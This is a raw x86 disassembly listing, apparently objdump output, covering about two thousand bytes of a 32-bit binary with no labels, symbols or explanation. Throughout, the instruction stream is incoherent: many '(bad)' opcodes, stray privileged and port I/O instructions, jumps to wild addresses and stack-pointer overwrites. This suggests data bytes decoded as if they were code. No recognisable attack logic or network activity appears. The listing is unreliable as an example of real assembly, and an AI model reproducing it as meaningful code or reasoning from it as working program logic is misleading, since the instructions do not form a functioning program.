  4186e1:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  4186e8:	jmp    0x418747
  4186ea:	mov    edi,0xff0272
  4186ef:	fdivr  QWORD PTR [ebp+0x5d]
  4186f2:	push   0x4e
  4186f4:	pop    ecx
  4186f5:	call   0x41cafa
  4186fa:	mov    DWORD PTR [ebx],eax
  4186fc:	in     al,0xc8
  4186fe:	rol    BYTE PTR [ebp-0x75],0xc1
  418702:	call   0xab88e3
  418707:	pop    esi
  418708:	enter  0xceff,0x8b
  41870c:	repz mov ecx,DWORD PTR [ebp-0x34]
  418710:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  418717:	je     0x418719
  418719:	or     DWORD PTR [ebx-0x74183b24],eax
  41871f:	jne    0x418705
  418721:	jmp    0x41871c
  418723:	push   DWORD PTR [edx-0x24]
  418726:	push   0x4d
  418728:	pop    ecx
  418729:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  41872d:	jge    0x418735
  41872f:	mov    eax,eax
  418731:	sub    ebp,DWORD PTR [edx+0x24]
  418734:	pop    esi
  418735:	inc    ebp
  418736:	mov    esp,0x8b6077
  41873b:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  418741:	lods   al,BYTE PTR ds:[esi]
  418742:	add    BYTE PTR [ebx],bh
  418744:	enter  0xce73,0x49
  418748:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  418750:	stc    
  418751:	jge    0x4187c5
  418753:	jnp    0xdd410ab4
  418759:	call   0xc4882f
  41875e:	fadd   st(0),st
  418760:	dec    esi
  418761:	ins    BYTE PTR es:[edi],dx
  418762:	stc    
  418763:	cmp    al,0x73
  418765:	push   ebp
  418766:	mov    eax,0xf8028b
  41876b:	jne    0x41872e
  41876d:	mov    esi,ecx
  41876f:	mov    esp,DWORD PTR [ebp+0x2c]
  418772:	add    edi,DWORD PTR [ebp-0x24]
  418775:	sub    esp,eax
  418777:	and    al,0x45
  418779:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  41877f:	sbb    al,0xee
  418781:	pop    esi
  418782:	call   0x8187b2
  418787:	fsubr  st,st(3)
  418789:	sti    
  41878a:	add    BYTE PTR gs:[ecx],bh
  41878d:	add    eax,esp
  41878f:	add    DWORD PTR [esi],eax
  418791:	rol    DWORD PTR [ebp+0x8],0x29
  418795:	mov    esp,eax
  418797:	clc    
  418798:	jne    0x41880f
  41879a:	mov    eax,0x8b0673
  41879f:	loopne 0x4187e6
  4187a1:	loopne 0x41872c
  4187a3:	lods   al,BYTE PTR ds:[esi]
  4187a4:	int3   
  4187a5:	inc    ebp
  4187a6:	mov    DWORD PTR gs:[eax+edi*8],eax
  4187aa:	add    al,0xc3
  4187ac:	sub    ecx,DWORD PTR [ebp+0x47]
  4187af:	(bad)  
  4187b1:	shr    BYTE PTR [ebp-0x1f],0xe8
  4187b5:	add    eax,DWORD PTR [eax]
  4187b7:	call   0x64348bc
  4187bc:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4187c2:	dec    esi
  4187c3:	ins    DWORD PTR es:[edi],dx
  4187c4:	in     al,dx
  4187c5:	lea    eax,[eax]
  4187c7:	inc    ebp
  4187c8:	inc    ebp
  4187c9:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4187cf:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4187d9:	and    al,0xdc
  4187db:	ror    DWORD PTR [edx+0x24],0xf7
  4187df:	or     BYTE PTR [ebp+0x4c],dh
  4187e2:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4187e6:	stos   BYTE PTR es:[edi],al
  4187e7:	adc    edx,edi
  4187e9:	inc    esp
  4187ea:	add    edi,DWORD PTR [eax]
  4187ec:	jne    0x4187d1
  4187ee:	mov    DWORD PTR [eax-0x7449db04],ecx
  4187f4:	cmp    ecx,DWORD PTR [edi]
  4187f6:	sub    BYTE PTR [ebp-0x7e],dl
  4187f9:	sar    ebp,0xb
  4187fc:	jmp    FWORD PTR [edi+0x2400392a]
  418802:	sub    esi,DWORD PTR [ebx-0x73]
  418805:	mov    esp,DWORD PTR [ecx+edi*4]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	and    BYTE PTR [eax],al
  41880c:	jne    0x4187d8
  41880e:	sub    ebp,ecx
  418810:	sbb    BYTE PTR [esi+0x32],ah
  418813:	dec    ebp
  418814:	push   ebp
  418815:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41881b:	ret    
  41881c:	mov    edx,ebp
  41881e:	leave  
  41881f:	sub    DWORD PTR [esi+0x24],ebx
  418822:	ret    0x2b
  418825:	pop    ax
  418827:	push   ebp
  418828:	rol    BYTE PTR [ebx],0xeb
  41882b:	add    DWORD PTR [ecx+0x6c0001],0x40
  418832:	jb     0x418889
  418834:	ret    
  418835:	in     al,dx
  418836:	jecxz  0x4187c3
  418838:	push   esi
  418839:	xchg   esp,eax
  41883a:	jne    0x41883c
  41883c:	cmp    edx,DWORD PTR [esi+0x1c]
  41883f:	jne    0x418825
  418841:	mov    eax,DWORD PTR [ebp-0x77]
  418844:	ror    DWORD PTR [ebx+0x899408],0xe0
  41884b:	mov    esi,DWORD PTR [ebp-0x75]
  41884e:	pop    esi
  41884f:	nop
  418850:	mov    eax,DWORD PTR [eax]
  418852:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  418858:	add    al,0x0
  41885a:	inc    ebp
  41885b:	mov    eax,DWORD PTR [ebx]
  41885d:	mov    ebp,ebx
  41885f:	cmp    al,0xf
  418861:	or     al,al
  418863:	inc    ebp
  418864:	inc    ebp
  418865:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41886b:	cld    
  41886c:	add    BYTE PTR [edi+0x556c16c0],dh
  418872:	add    BYTE PTR [ecx-0x5],dl
  418875:	add    eax,0x17200
  41887a:	sbb    al,0x85
  41887c:	dec    esp
  41887d:	je     0x4188b7
  41887f:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  418883:	add    BYTE PTR [ebx],bh
  418885:	(bad)  
  418886:	and    al,0x30
  418888:	jae    0x418826
  41888a:	mov    cl,cl
  41888c:	inc    DWORD PTR [esp]
  41888f:	push   ebp
  418890:	shr    esp,0x8
  418893:	in     al,dx
  418894:	push   esp
  418895:	add    DWORD PTR [eax],esp
  418897:	add    bl,cl
  418899:	inc    ebp
  41889a:	mov    bh,0x53
  41889c:	add    BYTE PTR [ebp-0x17],al
  41889f:	push   esi
  4188a0:	cmovne ecx,edx
  4188a3:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4188a7:	push   edi
  4188a8:	pop    ss
  4188a9:	xor    ecx,ebx
  4188ab:	pushf  
  4188ac:	add    BYTE PTR [ecx+0x452bf800],cl
  4188b2:	rcr    ecx,0x5
  4188b5:	inc    ebp
  4188b6:	add    esp,ebx
  4188b8:	add    BYTE PTR [ebp-0x40],al
  4188bb:	out    0x6c,eax
  4188bd:	inc    ebp
  4188be:	inc    eax
  4188bf:	sub    eax,0x450547c1
  4188c4:	dec    esp
  4188c5:	and    BYTE PTR cs:[ebp-0x27],al
  4188c9:	jo     0x4188f4
  4188cb:	leave  
  4188cc:	add    BYTE PTR [esi+0xc000c0],bh
  4188d2:	lea    eax,[esp-0x40]
  4188d6:	ret    
  4188d7:	mov    dh,0x8b
  4188d9:	xor    edx,DWORD PTR [ecx+0x3]
  4188dc:	mov    al,BYTE PTR [ecx+0x1]
  4188df:	sbb    BYTE PTR [eax],al
  4188e1:	stc    
  4188e2:	mov    esi,DWORD PTR [edx+0x8]
  4188e5:	(bad)  
  4188e6:	ss mov eax,0xb98ac631
  4188ec:	add    esi,eax
  4188ee:	add    BYTE PTR [edx-0x444d39f7],bh
  4188f4:	add    esi,eax
  4188f6:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  4188fd:	mov    BYTE PTR [eax],0xbe
  418900:	or     BYTE PTR [ebx],dh
  418902:	dec    ecx
  418903:	lea    eax,[ebx]
  418905:	or     eax,0x18fc0fc7
  41890a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41890b:	(bad)  
  41890d:	fiadd  WORD PTR [ebp-0x78]
  418910:	jae    0xed76905f
  418916:	or     BYTE PTR [ebp+0x7],al
  418919:	in     eax,dx
  41891a:	pushf  
  41891b:	inc    ebp
  41891c:	xor    bl,al
  41891e:	pop    esi
  41891f:	inc    ebp
  418920:	shl    esp,0xc
  418923:	inc    ebp
  418924:	sub    cl,0x1
  418927:	inc    ebp
  418928:	add    bh,bl
  41892a:	add    BYTE PTR [ebp-0x7b],al
  41892d:	loopne 0x418927
  41892f:	inc    ebp
  418930:	ret    0xe7
  418933:	inc    ebp
  418934:	mov    esi,DWORD PTR [eax-0x7f]
  418937:	leave  
  418938:	and    al,0x44
  41893a:	add    BYTE PTR [eax+0x331cb68b],dh
  418940:	mov    DWORD PTR [ebx],eax
  418942:	sbb    al,0x41
  418944:	(bad)  
  418945:	sbb    al,ah
  418947:	stc    
  418948:	test   DWORD PTR [edx-0x8],esi
  41894b:	lea    edi,[edi-0x7007a98]
  418951:	mov    DWORD PTR [ebp-0x2c],edi
  418954:	(bad)  
  418955:	dec    ebp
  418956:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  41895d:	add    edx,eax
  41895f:	(bad)  
  418960:	(bad)  
  418961:	inc    ebx
  418963:	jmp    FWORD PTR [edx-0x38]
  418966:	(bad)  
  418967:	or     al,ah
  418969:	jge    0x418931
  41896b:	mov    ebp,0x5a8533e4
  418971:	clc    
  418972:	leave  
  418973:	inc    ebp
  418974:	add    BYTE PTR [ebx+0xd8c8d],cl
  41897a:	rdpmc  
  41897c:	sbb    BYTE PTR [edi+0x7de08da],bh
  418982:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  418989:	cmovne edx,ebx
  41898c:	jmp    0x41898e
  41898e:	inc    ebp
  41898f:	mov    ebp,ebp
  418991:	sbb    al,0x45
  418993:	mov    ebx,ebx
  418995:	add    DWORD PTR [ebp+0x0],eax
  418998:	out    dx,al
  418999:	add    DWORD PTR [ebp+0x4d],eax
  41899c:	sub    eax,0x2e80458b
  4189a1:	add    BYTE PTR [ebp-0x77],al
  4189a4:	jo     0x418a10
  4189a6:	leave  
  4189a7:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4189af:	inc    ebp
  4189b0:	add    ebx,edi
  4189b2:	inc    ecx
  4189b3:	out    0x18,eax
  4189b5:	(bad)  
  4189b6:	stc    
  4189b7:	int3   
  4189b8:	jb     0x418944
  4189ba:	(bad)  
  4189bb:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4189c1:	or     dh,al
  4189c3:	dec    esi
  4189c4:	mov    dl,0xf3
  4189c6:	mov    BYTE PTR [ebp-0x4d],0x89
  4189ca:	(bad)  
  4189cb:	loopne 0x418981
  4189cd:	inc    esi
  4189cf:	lea    esi,[ebp-0x49003924]
  4189d5:	push   eax
  4189d6:	mov    BYTE PTR [ebp-0x49],0x33
  4189da:	xor    eax,DWORD PTR [ebx]
  4189dc:	lea    edx,[eax+0xd]
  4189df:	inc    ebp
  4189e0:	jae    0x8c1beffe
  4189e6:	ficomp WORD PTR [eax+ecx*4]
  4189e9:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  4189f0:	test   esi,edi
  4189f2:	(bad)  
  4189f3:	(bad)  
  4189f4:	inc    DWORD PTR [eax]
  4189f6:	inc    ebp
  4189f7:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  4189fd:	test   DWORD PTR [ebx],edx
  4189ff:	jne    0x41898a
  418a01:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  418a0b:	jmp    0x1258a99
  418a10:	inc    ebp
  418a11:	jne    0x4189f5
  418a13:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  418a1a:	mov    BYTE PTR [ebp+0x45009c01],cl
  418a20:	shl    BYTE PTR [eax],0x55
  418a23:	push   cx
  418a25:	mov    bx,0x7245
  418a29:	gs add bh,al
  418a2c:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  418a33:	inc    ebp
  418a34:	dec    ebp
  418a35:	into   
  418a36:	mov    esp,ebx
  418a38:	jl     0x418a01
  418a3a:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  418a41:	inc    ebp
  418a42:	mov    edi,ebx
  418a44:	add    ebp,esp
  418a46:	add    BYTE PTR [esi+0x1],ah
  418a49:	inc    ebp
  418a4a:	or     BYTE PTR [edi],bh
  418a4c:	inc    ebp
  418a4d:	(bad)  
  418a4e:	in     eax,dx
  418a4f:	fsubr  st(4),st
  418a51:	inc    edi
  418a53:	add    dl,al
  418a55:	add    al,ah
  418a57:	call   0x86a2cc
  418a5c:	pop    esi
  418a5d:	test   DWORD PTR [eax],ecx
  418a5f:	dec    dl
  418a61:	(bad)  
  418a62:	jmp    0x414012ec
  418a67:	push   DWORD PTR [ebp-0x75]
  418a6a:	(bad)  
  418a6b:	loopne 0x418a39
  418a6d:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  418a77:	push   eax
  418a78:	inc    DWORD PTR [ebp-0x75]
  418a7b:	mov    esp,eax
  418a7d:	cwde   
  418a7e:	mov    DWORD PTR [eax],0xff8bffc3
  418a84:	sbb    al,0x8
  418a86:	ror    BYTE PTR [ebp+0x50],0x51
  418a8a:	inc    ebp
  418a8b:	ror    BYTE PTR [ebx+0x65987d],1
  418a91:	test   edi,eax
  418a93:	add    al,0xdc
  418a95:	add    bh,bh
  418a97:	push   0x1
  418a99:	add    BYTE PTR [eax],al
  418a9b:	mov    edi,edi
  418a9d:	inc    WORD PTR [ebp+0x8]
  418aa1:	add    eax,0xd
  418aa4:	(bad)  
  418aa6:	xor    eax,0x782ec89
  418aab:	push   ecx
  418aac:	cli    
  418aad:	popw   es
  418aaf:	push   ebp
  418ab0:	xchg   BYTE PTR [ebx-0x76740800],al
  418ab6:	sbb    al,0x86
  418ab8:	test   DWORD PTR [ecx-0x2],edx
  418abb:	call   WORD PTR [ebp-0x40]
  418abf:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  418ac3:	mov    eax,ebx
  418ac5:	mov    dh,BYTE PTR ds:0xc7666851
  418acb:	push   ebp
  418acc:	fsub   QWORD PTR [esi+0x0]
  418acf:	dec    ebp
  418ad0:	inc    ebp
  418ad1:	mov    edx,0xec4ec0
  418ad6:	(bad)  
  418ad7:	retf   0x89a0
  418ada:	fist   DWORD PTR [eax+0x454ae1]
  418ae0:	jmp    0xa8b5:0xc7663e8b
  418ae7:	jmp    edx
  418ae9:	(bad)  
  418aea:	in     eax,dx
  418aeb:	lock (bad) 
  418aed:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  418af4:	(bad)  
  418af5:	xor    eax,0x700089ff
  418afa:	add    bh,bh
  418afc:	stos   DWORD PTR es:[edi],eax
  418afd:	data16 add BYTE PTR [ebp-0x1b0077],al
  418b04:	inc    DWORD PTR [ecx-0x73]
  418b07:	data16 fadd QWORD PTR [ebp-0xaf0001]
  418b0e:	inc    ebp
  418b0f:	shl    BYTE PTR [ebx],0x66
  418b12:	add    eax,DWORD PTR [ebp-0xba00b0]
  418b18:	add    DWORD PTR [ecx+0x44],0x66
  418b1c:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  418b22:	add    DWORD PTR [ecx-0xcf8600],ecx
  418b28:	push   ebp
  418b29:	lea    dx,[ebp-0x28]
  418b30:	add    BYTE PTR [ebp-0x25],0xf
  418b34:	jge    0xff428a3b
  418b3a:	mov    ecx,0xc34fc7
  418b3f:	rol    ecx,0x89
  418b42:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  418b46:	ror    BYTE PTR [ebx-0x48990775],0x55
  418b4d:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  418b54:	test   BYTE PTR [ecx-0x3f997f3e],cl
  418b5a:	push   ebp
  418b5b:	mov    DWORD PTR [ebp-0x76761480],ecx
  418b61:	or     BYTE PTR [eax+0x6600c265],0x45
  418b68:	push   ebp
  418b69:	xor    DWORD PTR [ebp-0x76381e64],ecx
  418b6f:	aam    0x8c
  418b71:	test   DWORD PTR [ecx-0x3dba7108],ecx
  418b77:	cmp    eax,0xc78b9c00
  418b7c:	data16 hlt 
  418b7e:	dec    ebp
  418b7f:	test   DWORD PTR [ecx+0x454ff8],edi
  418b85:	xor    ecx,esi
  418b87:	lahf   
  418b88:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  418b8e:	mov    eax,DWORD PTR [ecx]
  418b90:	data16 add BYTE PTR [ebp-0x7400bb],dh
  418b97:	sbb    al,0x71
  418b99:	dec    ebp
  418b9a:	mov    si,WORD PTR [ebp-0xff0074]
  418ba1:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  418ba7:	add    BYTE PTR [ebp-0x760fd477],cl
  418bad:	jne    0x418c23
  418baf:	test   edi,edi
  418bb1:	jne    0x418b36
  418bb3:	(bad)  
  418bb4:	sti    
  418bb5:	sbb    BYTE PTR [ecx-0x1789ab],cl
  418bbb:	cld    
  418bbc:	(bad)  
  418bbd:	jmp    DWORD PTR [ecx]
  418bbf:	inc    ebp
  418bc0:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  418bc6:	data16 cmp al,0x8d
  418bc9:	push   cs
  418bca:	inc    DWORD PTR [ebp-0x1]
  418bcd:	test   DWORD PTR [ecx-0x838c],ecx
  418bd3:	sbb    al,0x8b
  418bd5:	lock clc 
  418bd7:	push   DWORD PTR [edi-0xe39375]
  418bdd:	xor    BYTE PTR [ebx],0x1
  418be0:	add    eax,DWORD PTR [eax]
  418be2:	xor    eax,DWORD PTR [eax]
  418be4:	mov    WORD PTR [ebp-0xba003d],0x4575
  418bed:	mov    ecx,DWORD PTR [edi]
  418bef:	sbb    al,0x4d
  418bf1:	mov    DWORD PTR [ebx],esi
  418bf3:	add    DWORD PTR [ebx],eax
  418bf5:	add    BYTE PTR [ebx],dh
  418bf7:	xor    DWORD PTR [esi-0x80],esp
  418bfa:	inc    ebp
  418bfb:	add    DWORD PTR [ebx],esi
  418bfd:	add    BYTE PTR [esi+0x50],ah
  418c00:	inc    ebp
  418c01:	jmp    0x868e6c
  418c06:	add    DWORD PTR [eax+0xc70194],0xffffffec
  418c0d:	or     BYTE PTR [ebp+0x4501f845],dh
  418c13:	jmp    0xdd8f09
  418c18:	(bad)  
  418c19:	push   cs
  418c1a:	in     al,0xc9
  418c1c:	test   DWORD PTR [ebp+0x4502f8],eax
  418c22:	xor    ecx,DWORD PTR [ebp-0x64]
  418c25:	mov    eax,edi
  418c27:	mov    esp,esp
  418c29:	push   eax
  418c2a:	add    eax,0x45fff885
  418c2f:	dec    DWORD PTR [ebx+0x339445]
  418c35:	add    ecx,DWORD PTR [ecx+0x452ce889]
  418c3b:	dec    DWORD PTR [ebx-0x4e0be375]
  418c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c42:	add    edi,edi
  418c44:	add    bh,bh
  418c46:	push   cs
  418c47:	xor    eax,DWORD PTR [eax+0x890103]
  418c4d:	xor    BYTE PTR [ebp-0x1],al
  418c50:	mov    DWORD PTR [ebp-0x36df38],ecx
  418c56:	push   cs
  418c57:	push   eax
  418c58:	jne    0x418c9f
  418c5a:	mov    esi,DWORD PTR [ebx]
  418c5c:	sbb    al,0x3
  418c5e:	jne    0x418cb0
  418c60:	inc    DWORD PTR [ebp-0x75]
  418c63:	add    eax,0x800f0
  418c68:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  418c6e:	mov    DWORD PTR [ecx],eax
  418c70:	sbb    BYTE PTR [eax],al
  418c72:	leave  
  418c73:	test   DWORD PTR [edi-0x1],eax
  418c76:	jne    0x418c77
  418c78:	call   0xff42777d
  418c7d:	xor    BYTE PTR [ebp+0x4d],al
  418c80:	mov    edi,edi
  418c82:	enter  0x8,0x4d
  418c86:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  418c8c:	mov    eax,DWORD PTR [eax]
  418c8e:	sbb    al,0x1
  418c90:	sbb    DWORD PTR [ebp+0x4d],eax
  418c93:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  418c99:	inc    eax
  418c9a:	dec    DWORD PTR [ecx-0x27d775]
  418ca0:	add    BYTE PTR [ebx-0x38d72b01],cl
  418ca6:	xchg   ecx,eax
  418ca7:	ret    
  418ca8:	add    BYTE PTR [ebp-0x830075],al
  418cae:	add    BYTE PTR [ebp-0x75],al
  418cb1:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  418cb7:	lea    edi,[edi+0x20]
  418cba:	add    bh,bh
  418cbc:	mov    edx,DWORD PTR [eax-0x7b]
  418cbf:	inc    ebp
  418cc0:	rdpmc  
  418cc2:	jne    0x418cc7
  418cc4:	add    BYTE PTR [eax-0x75],dl
  418cc7:	inc    ebp
  418cc8:	call   0x404195d2
  418ccd:	add    BYTE PTR [ecx-0xe3d775],cl
  418cd3:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  418cda:	ret    
  418cdb:	inc    DWORD PTR [ebp-0xff0001]
  418ce1:	add    BYTE PTR [ebp-0x4b],al
  418ce4:	cmp    edi,0x24
  418ce7:	(bad)  
  418ce8:	push   DWORD PTR [eax]
  418cea:	add    BYTE PTR [ebp-0x39],dl
  418ced:	test   ebx,eax
  418cef:	je     0x418c76
  418cf1:	mov    edi,edi
  418cf3:	sbb    bh,bh
  418cf5:	test   DWORD PTR gs:[eax],eax
  418cf8:	(bad)  
  418cf9:	js     0x418cfa
  418cfb:	add    BYTE PTR [ebx-0x38b21fdd],cl
  418d01:	sub    eax,ebx
  418d03:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  418d09:	add    eax,DWORD PTR [eax]
  418d0b:	dec    ebp
  418d0c:	push   eax
  418d0d:	mov    al,BYTE PTR [ebp+0x1]
  418d10:	mov    eax,DWORD PTR [ebp-0x68]
  418d13:	mov    eax,DWORD PTR [eax]
  418d15:	cld    
  418d16:	(bad)  
  418d17:	or     BYTE PTR [eax],ah
  418d19:	dec    ebp
  418d1a:	inc    DWORD PTR [eax+0x4]
  418d1d:	push   ecx
  418d1e:	add    BYTE PTR [edx-0x1],dh
  418d21:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  418d27:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  418d31:	add    ecx,DWORD PTR [ecx-0xf037477]
  418d37:	push   ecx
  418d38:	xor    BYTE PTR [ebx],al
  418d3a:	inc    ebp
  418d3b:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  418d41:	(bad)  
  418d42:	push   eax
  418d44:	inc    DWORD PTR [eax]
  418d46:	inc    ebp
  418d47:	add    BYTE PTR [ebx],dh
  418d49:	add    BYTE PTR [ebx],0x0
  418d4c:	mov    DWORD PTR [ebx-0x150007d4],eax
  418d52:	lea    edx,[ebp-0x6c]
  418d55:	je     0x418cdc
  418d57:	(bad)  
  418d58:	dec    DWORD PTR [eax]
  418d5a:	call   DWORD PTR [ebp-0x7b]
  418d5d:	mov    edi,edi
  418d5f:	hlt    
  418d60:	call   DWORD PTR [ebp-0x75]
  418d63:	mov    esp,eax
  418d65:	cwde   
  418d66:	(bad)  
  418d67:	mov    bh,0xc3
  418d69:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  418d6f:	add    DWORD PTR [eax],0x450050ff
  418d75:	mov    DWORD PTR [ebx+0x9598c8],ecx
  418d7b:	inc    edi
  418d7d:	jmp    DWORD PTR [eax]
  418d7f:	jmp    0xcd00:0x640481ff
  418d86:	mov    DWORD PTR [ebx],esi
  418d88:	and    al,0x81
  418d8a:	push   DWORD PTR [edx]
  418d8c:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  418d93:	add    esi,DWORD PTR [eax]
  418d95:	enter  0x3c45,0x83
  418d99:	add    ah,bh
  418d9b:	adc    DWORD PTR [ebx+0x768b5055],eax
  418da1:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  418da7:	mov    esi,eax
  418da9:	xor    BYTE PTR [ebp+0x45],cl
  418dac:	jmp    0x418d39
  418dae:	mov    ebx,DWORD PTR [eax]
  418db0:	in     al,dx
  418db1:	inc    ebp
  418db2:	or     al,0x2
  418db4:	dec    DWORD PTR [ebp-0x4]
  418db7:	jne    0x418e0e
  418db9:	mov    ecx,DWORD PTR [eax+0x18558be8]
  418dbf:	mov    edi,DWORD PTR [ebx]
  418dc1:	lock push eax
  418dc3:	xchg   ecx,eax
  418dc4:	jmp    0x341dbc9
  418dc9:	adc    al,0x8b
  418dcb:	inc    ebp
  418dcc:	mov    al,ds:0x8b04008b
  418dd1:	push   ebp
  418dd2:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  418dd8:	push   ebp
  418dd9:	test   DWORD PTR [ebx-0x2900d701],ecx
  418ddf:	inc    ebp
  418de0:	dec    ebp
  418de1:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  418de7:	mov    DWORD PTR [eax],0xe9ff0020
  418ded:	add    al,0x0
  418def:	add    BYTE PTR [eax],al
  418df1:	mov    eax,edx
  418df3:	push   eax
  418df4:	rol    DWORD PTR [ebp-0xb0077],1
  418dfa:	bound  eax,QWORD PTR [ebp+0x50]
  418dfd:	xor    ecx,DWORD PTR [ecx+0x55899803]
  418e03:	sub    al,0x89
  418e05:	push   esp
  418e07:	lea    edx,[ebp-0x6c]
  418e0a:	jne    0xffd78d22
  418e10:	inc    DWORD PTR [ebp-0x1d0001]
  418e16:	jnp    0xc7976e1c
  418e1c:	mov    eax,ebx
  418e1e:	fs mov edi,edi
  418e21:	sbb    al,0xc1
  418e23:	out    dx,al
  418e24:	or     al,0x0
  418e26:	ret    0x8d50
  418e29:	inc    ebp
  418e2a:	dec    DWORD PTR [ebx+0xfa98d7]
  418e30:	test   edi,edi
  418e32:	clc    
  418e33:	call   FWORD PTR [edi]
  418e35:	or     BYTE PTR [eax],cl
  418e37:	inc    ebp
  418e38:	dec    ebp
  418e39:	inc    DWORD PTR [ebx+0x74803114]
  418e3f:	add    DWORD PTR [ebx+0x45fc00],ecx
  418e45:	call   DWORD PTR [eax+edx*1]
  418e48:	add    ecx,DWORD PTR [ebp-0x38]
  418e4b:	push   esi
  418e4c:	adc    al,0x8
  418e4e:	mov    edx,DWORD PTR [ebp-0x14]
  418e51:	mov    ecx,DWORD PTR [ebp-0x4]
  418e54:	add    DWORD PTR [ebp-0x68],0xffffff8d
  418e58:	inc    DWORD PTR [esp+esi*8]
  418e5b:	inc    ebp
  418e5c:	stos   BYTE PTR es:[edi],al
  418e5d:	mov    edx,DWORD PTR [ebp+0x1c]
  418e60:	add    DWORD PTR [ebp-0x10],eax
  418e63:	mov    edx,DWORD PTR [ebp-0x70]
  418e66:	cmp    eax,DWORD PTR [eax]
  418e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e69:	mov    eax,DWORD PTR [eax]
  418e6b:	sbb    al,0x73
  418e6d:	add    BYTE PTR [ebx],0x1
  418e70:	call   0x8971de75
  418e75:	xor    eax,ebp
  418e77:	pop    ds
  418e78:	inc    ebp
  418e79:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  418e7f:	(bad)  
  418e80:	push   DWORD PTR [edi]
  418e82:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  418e88:	push   DWORD PTR [ebx-0x1]
  418e8b:	mov    eax,DWORD PTR [ebp-0x740075]
  418e91:	sub    eax,DWORD PTR [eax]
  418e93:	add    eax,DWORD PTR [eax]
  418e95:	mov    DWORD PTR [ecx+0x5f],eax
  418e98:	mov    DWORD PTR [ebx+0x28],ebx
  418e9b:	ret    0xff
  418e9e:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  418ea4:	ret    
  418ea5:	mov    eax,DWORD PTR [ebp-0x6f0075]
  418eab:	add    BYTE PTR [ebp-0x7d],al
  418eae:	mov    DWORD PTR [eax],eax
  418eb0:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  418eb7:	sar    bh,cl
  418eb9:	test   BYTE PTR [eax+0x1],dl
  418ebc:	inc    ebp
  418ebd:	add    BYTE PTR [ebx],dh
  418ebf:	test   BYTE PTR [ebx],0x84
  418ec2:	push   eax
  418ec3:	add    BYTE PTR [ebp+0x0],al
  418ec6:	add    eax,0x86
  418ecb:	add    BYTE PTR [ebx-0x7f7be340],cl
  418ed1:	add    BYTE PTR [ecx],al
  418ed3:	add    BYTE PTR [eax],al
  418ed5:	mov    esi,0x550030
  418eda:	mov    ecx,DWORD PTR [edi]
  418edc:	sbb    al,0xda
  418ede:	jne    0x418ee0
  418ee0:	mov    edi,DWORD PTR [ecx]
  418ee2:	xor    BYTE PTR [eax+eax*1],0x84
  418ee6:	add    eax,DWORD PTR [eax]
  418ee8:	cld    
  418ee9:	add    BYTE PTR [ebp-0x4f],dh
  418eec:	mov    eax,DWORD PTR [ecx]
  418eee:	cld    
  418eef:	add    BYTE PTR [ecx-0x1bff009b],cl
  418ef5:	retf   0xe45
  418ef8:	add    eax,edx
  418efa:	sbb    al,0xb7
  418efc:	dec    ebp
  418efd:	or     al,0x89
  418eff:	dec    ebp
  418f00:	sbb    al,0xf
  418f02:	inc    ebp
  418f03:	dec    eax
  418f04:	mov    eax,DWORD PTR [ebx]
  418f06:	sbb    al,0xf
  418f08:	nop
  418f09:	scas   al,BYTE PTR es:[edi]
  418f0a:	add    DWORD PTR [eax],eax
  418f0c:	add    BYTE PTR [ebp-0x7674ebbb],cl
  418f12:	mov    eax,gs
  418f14:	add    bh,bh
  418f16:	mov    edi,edi
  418f18:	cmp    DWORD PTR [edi+0x72],edx
  418f1b:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  418f21:	gs cmp al,0x0
  418f24:	je     0x418efc
